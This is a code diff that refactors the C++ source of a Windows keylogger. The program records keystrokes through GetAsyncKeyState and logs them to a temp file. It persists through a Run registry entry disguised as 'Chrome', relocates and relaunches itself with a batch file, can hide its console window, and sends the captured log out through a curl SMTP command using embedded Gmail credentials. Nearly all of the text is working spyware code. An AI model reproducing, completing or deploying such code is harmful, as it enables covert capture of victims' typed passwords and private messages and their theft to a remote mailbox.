@@ -7,8 +7,9 @@
 #include <sstream>
 #include <tchar.h>
 #include <Lmcons.h>
-#include <iostream>
+#include <iostream> //if i didn't remove that, i have forgotten about it, i need it when i testing
 
+#pragma warning(disable : 4996)
 
 //U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
 const std::string exe_name = "keylogger.exe";
@@ -16,32 +17,14 @@ const std::string LogFileName = "data.th";
 const std::string EmailFrom = "example@gmail.com";
 const std::string EmailFromPassword = "YourPassowrd";
 const std::string EmailTo = "example@gmail.com";
-
-
-#pragma warning(disable : 4996)
-
-bool test = 1;
-bool wymaganie = 1;
+const bool IsWindowHidden = false;
 
 using namespace std;
 
- 
 void send() {
-	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"";
-	cmd += EmailFrom;
-	cmd += "\\\" --mail-rcpt \\\"";
-	cmd += EmailTo;
-	cmd += "\\\" --ssl --upload-file ";
-	cmd += "%temp%\\";
-	cmd += LogFileName;
-	cmd += " -u ";
-	cmd += EmailFrom;
-	cmd += ":";
-	cmd += EmailFromPassword;
-	cmd += " -k --anyauth";
-	//cout << cmd;
+	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
+//	cout << cmd;
 	system(cmd.c_str());
-
 }
 
 inline bool filexits(const std::string& name) {
@@ -51,6 +34,23 @@ inline bool filexits(const std::string& name) {
 
 
 
+string cmd3;
+
+void set_cmd3()
+{
+	char username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+	GetUserName(username, &username_len);
+
+	char letter[UNLEN + 1];
+	GetSystemDirectory(letter, sizeof(letter));
+
+
+	cmd3 = letter[0];
+	cmd3 += ":\\Users\\";
+	cmd3 += username;
+	cmd3 += "\\AppData\\Local\\Temp\\";
+}
 
 void autostart() {
 	char username[UNLEN + 1];
@@ -60,24 +60,24 @@ void autostart() {
 	char letter[UNLEN + 1];
 	GetSystemDirectory(letter, sizeof(letter));
 
-	string cmd;
-	cmd = letter[0];
-	cmd += ":\\Users\\";
-	cmd += username;
-	cmd += "\\AppData\\Local\\Temp\\";
-	cmd += exe_name;
-	if (!filexits(cmd.c_str())) {
+
+	cmd3 = letter[0];
+	cmd3 += ":\\Users\\";
+	cmd3 += username;
+	cmd3 += "\\AppData\\Local\\Temp\\";
+	if (!filexits(cmd3.c_str())) {
 		
-		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd;
+		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d "+cmd3 + exe_name;
 		system(cmd2.c_str());
 
 		fstream file;
-		file.open("djna.bat", ios::out);
+		file.open("temp.bat", ios::out);
 		file << "taskkill /IM " + exe_name + " /F\n";
 		file << "move " + exe_name + " %temp%\n";
 		file << "start  %temp%\\"+ exe_name;
 		file << "\ndel temp.bat";
 		file << "\nexit";
+		file.close();
 		system("start temp.bat");
 
 	}
@@ -99,59 +99,45 @@ void LOG(string input) {
 bool SpecialKeys(int S_Key) {
 	switch (S_Key) {
 	case VK_SPACE:
-		//cout << "$SPACE#";
-		LOG(" ");
+		LOG(" #SPACE# ");
 		return true;
 	case VK_RETURN:
-	//	cout << "\n";
-		LOG("\n");
+		LOG("\n#ENTER# ");
 		return true;
 	case '.':
-    //cout << ".";
 		LOG(".");
 		return true;
 	case VK_SHIFT:
-	//	cout << "#SHIFT# ";
 		LOG(" #SHIFT# ");
 		return true;
 	case VK_BACK:
-	//	cout << " #BACKSPACE# ";
 		LOG(" #BACKSPACE# ");
 		return true;
 	case VK_RBUTTON:
-	//	cout << " #R_CLICK# ";
 		LOG(" #R_CLICK# ");
 		return true;
 	case VK_CAPITAL:
-	//	cout << " #CAPS_LOCK# ";
 		LOG(" #CAPS_LOCK# ");
 		return true;
 	case VK_TAB:
-	//	cout << "#TAB#";
 		LOG(" #TAB# ");
 		return true;
 	case VK_UP:
-	//	cout << "#UP#";
 		LOG(" #UP_ARROW# ");
 		return true;
 	case VK_DOWN:
-	//	cout << "#DOWN#";
 		LOG(" #DOWN_ARROW# ");
 		return true;
 	case VK_LEFT:
-	//	cout << "#LEFT#";
 		LOG(" #LEFT_ARROW# ");
 		return true;
 	case VK_RIGHT:
-	//	cout << " #RIGHT# ";
 		LOG(" #RIGHT_ARROW# ");
 		return true;
 	case VK_CONTROL:
-	//	cout << "#CONTROL#";
 		LOG(" #CONTROL_ARROW# ");
 		return true;
 	case VK_MENU:
-	//	cout << "#ALT#";
 		LOG(" #ALT# ");
 		return true;
 	default:
@@ -164,25 +150,28 @@ bool SpecialKeys(int S_Key) {
 
 int main()
 {
-	//yeah i know its shitty unreadable code
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	Sleep(500);
+	//all here look shitty but  works
+	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
 	
+	set_cmd3();
 	fstream LogFile;
-	string wynik2 = "%temp%\\";
-	wynik2 += LogFileName;
-	LogFile.open(wynik2, ios::out);;
-	LogFile.close();
+	cmd3 += LogFileName;
+	LogFile.open(cmd3, ios::out);
+	cout << cmd3;
+
+	Sleep(500);
+	bool test = 1;
+	bool wymaganie = 1;
     autostart();
 	send();
 	
 	string jd;
 	string jd2;
 	int wynik;
-	wynik2.clear();
+	string wynik2;
 	string linia;
 	char KEY = 'x';
-	LogFile.open(LogFileName, fstream::app);
+	
 
 	time_t t;
 	struct tm* tt;
@@ -222,7 +211,7 @@ int main()
 		Sleep(10);
 		for (int KEY = 8; KEY <= 190; KEY++)
 		{
-			// reading chars
+			// Logging chars
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
 					//Log to LogFileName
